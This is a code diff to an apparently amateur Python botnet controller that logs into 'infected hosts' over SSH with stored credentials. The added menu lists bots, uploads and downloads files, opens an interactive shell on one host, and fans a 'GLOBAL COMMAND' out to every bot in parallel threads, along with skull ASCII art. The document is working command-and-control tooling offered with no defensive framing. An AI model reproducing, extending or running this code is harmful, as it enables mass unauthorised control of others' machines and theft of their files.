@@ -1,8 +1,9 @@
 import re
-from typing import Any, List
+from colorama import Back, Fore
+import sys
+from typing import Any, List, Optional
 import paramiko
 from pexpect import pxssh
-
 from connections import Connections
 from dao import SelectBotDao
 from dataclasses import dataclass
@@ -13,6 +14,9 @@ from multiprocessing import Process
 
 @dataclass
 class BotnetServer(ServerInterface):
+    print(Fore.LIGHTMAGENTA_EX + "And so I clothed my naked villainy with "
+                                 "rags stolen from the scriptures,"
+                                 "and played the saint when in truth I was the devil.")
     __global_conn: Any = None
     __conn: Connections = Connections()
     __bots: SelectBotDao = SelectBotDao()
@@ -56,7 +60,7 @@ class BotnetServer(ServerInterface):
 
     def __commands(self, conn):
         while True:
-            command: str = input(">>> [type 'exit' to finish]: ")
+            command: str = input(Fore.GREEN + ">>> [type 'exit' to finish]: ")
             if command == "exit":
                 conn.logout()
                 break
@@ -74,7 +78,8 @@ class BotnetServer(ServerInterface):
                   host: str,
                   user: str,
                   password: str,
-                  option: int) -> None:
+                  option: int,
+                  command: Optional[str] = None) -> None:
         """
         allow to navigate into remote machine
         :param host:
@@ -92,13 +97,14 @@ class BotnetServer(ServerInterface):
 
         else:
             self.__client(
-                           host,
-                           user,
-                           password
-                       )
+                host,
+                user,
+                password,
+                command
+            )
 
     def __client(self, host: str, user: str, password: str, command: str) -> None:
-        print(host, user, password)
+        print(Fore.RED + f"[+]Connected {host} -> {user}")
         ssh = pxssh.pxssh()
         ssh.login(host, user, password)
         ssh.sendline(command)
@@ -110,11 +116,116 @@ class BotnetServer(ServerInterface):
                            host: str,
                            user: str,
                            password: str,
-                           option: int) -> None:
+                           option: int,
+                           command: Optional[str] = None) -> None:
         with self.__conn.connection_ssh(host=host,
                                         user=user,
                                         password=password) as conn:
             self.__global_conn = conn
+            try:
+                while True:
+                    print(Back.LIGHTYELLOW_EX + " ☠ " * 25)
+                    print(Back.RESET)
+                    print(Fore.RED + f"""
+                            BOT NET BOT NET BOT NET BOT 
+                            ███████▀▀▀░░░░░░░▀▀▀███████ 
+                            ████▀░░░░░░░░░░░░░░░░░▀████ 
+                            ███│░░░░░░░░░░░░░░░░░░░│███ 
+                            ██▌│░░░░░░░░░░░░░░░░░░░│▐██ 
+                            ██░└┐░░░░░░░░░░░░░░░░░┌┘░██ 
+                            ██░░└┐░░░░░░░░░░░░░░░┌┘░░██ 
+                            ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██ 
+                            ██▌░│██████▌░░░▐██████│░▐██ 
+                            ███░│▐███▀▀░░▄░░▀▀███▌│░███ 
+                            ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██ 
+                            ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██ 
+                            ████▄─┘██▌░░░░░░░▐██└─▄████ 
+                            █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████ 
+                            ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████ 
+                            █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████ 
+                            ███████▄░░░░░░░░░░░▄███████ 
+                            ██████████▄▄▄▄▄▄▄██████████ 
+                            ███████████████████████████ 
+                            BOT NET BOT NET BOT NET BOT""")
+                    print(Fore.GREEN + "Options: ")
+                    option: int = int(input(Fore.RED + f"1-List infected hosts{'  ' * 25}\n"
+                                                       "2-List specified host\n"
+                                                       "3-Upload file to host\n"
+                                                       "4-Download file from host\n"
+                                                       "5-Control a specified host\n"
+                                                       "6-Control a massive infected hosts\n"
+                                                       "7-Exit\n"
+                                                       f"{Fore.WHITE}Choice: "))
+                    print(Back.LIGHTYELLOW_EX + " ☠ " * 25)
+                    print(Back.RESET)
+                    match option:
+                        case 1:
+                            for bott in self.get_all_bots():
+                                print(f"{bott}")
+                        case 2:
+                            choice: str = input(Fore.LIGHTGREEN_EX + "Search by\n"
+                                                                     "1-Id\n"
+                                                                     "2-Username\n"
+                                                                     "Choice: ")
+                            if choice == '1':
+                                try:
+                                    id: int = int(input("id: "))
+                                    print(self.get_bot(id=id))
+                                except ValueError as e:
+                                    print(Fore.RED + "The value must be integer")
+                            elif choice == '2':
+                                username: str = input("username: ")
+                                print(Fore.YELLOW + f"-> Result: {self.get_bot(user=username)}")
+                            else:
+                                print(Fore.RED + "[-] Invalid option")
+                                sys.exit(0)
+                        case 3:
+                            print("example origin file: /home/user/text.txt\n"
+                                  "example remote file: /home/user/text.txt")
+                            files: str = input("origin file path: ")
+                            remote: str = input("remote file path: ")
+                            self.upload_files(files,
+                                              remote,
+                                              user=user,
+                                              host=host,
+                                              pw=password
+                                              )
+                        case 4:
+                            print("example origin file: /home/user/text.txt\n"
+                                  "example remote file: /home/user/text.txt")
+                            files: str = input("origin file path: ")
+                            remote: str = input("remote file path: ")
+                            self.download_files(files,
+                                                remote,
+                                                user=user,
+                                                host=host,
+                                                pw=password
+                                                )
+                        case 5:
+                            self.get_shell(host,
+                                           user,
+                                           password,
+                                           1)
+                        case 6:
+                            command: str = input(Fore.BLUE + "GLOBAL COMMAND: ")
+                            threads: List[Thread] = []
+                            for b in self.get_all_bots():
+                                t = Thread(target=self.get_shell,
+                                       args=(b.host,
+                                             b.username,
+                                             b.password,
+                                             3,
+                                             command))
+                                t.start()
+                                threads.append(t)
+                            [t.join() for t in threads]
+
+                        case 7:
+                            sys.exit(0)
+            except ValueError as e:
+                print("The value must be integer")
+            except KeyboardInterrupt:
+                pass
 
 
 if __name__ == '__main__':
@@ -127,8 +238,8 @@ if __name__ == '__main__':
                               bot.username,
                               bot.password,
                               4))"""
-        #t.start()
-        #bots.append(t)
+        # t.start()
+        # bots.append(t)
         """bs.get_shell(bot.host,
                              bot.username,
                              bot.password, 1)"""
